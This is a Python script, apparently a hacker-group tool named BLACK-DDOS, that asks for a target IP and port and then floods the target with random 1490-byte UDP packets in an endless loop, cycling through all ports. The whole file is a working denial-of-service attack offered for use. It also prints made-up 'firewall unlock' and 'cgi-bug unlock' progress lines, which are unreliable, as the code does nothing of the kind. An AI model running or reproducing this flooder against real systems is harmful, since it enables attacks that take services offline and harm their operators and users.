#!/usr/bin/python
# -*- coding: utf-8 -*-
##
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print ("\33[31;1m █▀▄ █── ▄▀▄ ▄▀ █─▄▀ █▀▄ █▀▄ ▄▀▄ ▄▀▀")
print ("\33[31;1m █▀█ █─▄ █▀█ █─ █▀▄─ █─█ █─█ █─█ ─▀▄")
print ("\33[37;1m ▀▀─ ▀▀▀ ▀─▀ ─▀ ▀─▀▀ ▀▀─ ▀▀─ ─▀─ ▀▀ ─ V.1.1.0")
print
print ("\33[31;1m===========================================")
print ("\33[0;32m|Author : *MR.BLACK-HORNET92*             |")
print ("\33[0;32m|       : *MR.YUDI*                       |")
print ("\33[0;32m|version: 1.1.0 BLACK-DDOS 2020           |")
print ("\33[0;32m|Team   : ANONYMOUS CYBER TEAM INDONESIA  |")
print ("\33[31;1m===========================================")
print
ip = raw_input("IP or hostname Target : ")
port = input("Port       : ")

os.system("clear")
print ("\33[33;1m █▀▄ █░░ ▄▀▄ ▄▀ █░▄▀ █▀▄ █▀▄ ▄▀▄ ▄▀▀")
print ("\33[31;1m █▀█ █░▄ █▀█ █░ █▀▄░ █░█ █░█ █░█ ░▀▄")
print ("\33[0;32m ▀▀░ ▀▀▀ ▀░▀ ░▀ ▀░▀▀ ▀▀░ ▀▀░ ░▀░ ▀▀░")
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.20)
print ("============================================")
mengetik('cgi-bug  unlock🔑        =====100%')
mengetik('firewall unlock🔑        =====100%')
mengetik('mchanize system unlock🔑 =====100%')
mengetik('📬please waiting send to packet📬')
mengetik('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
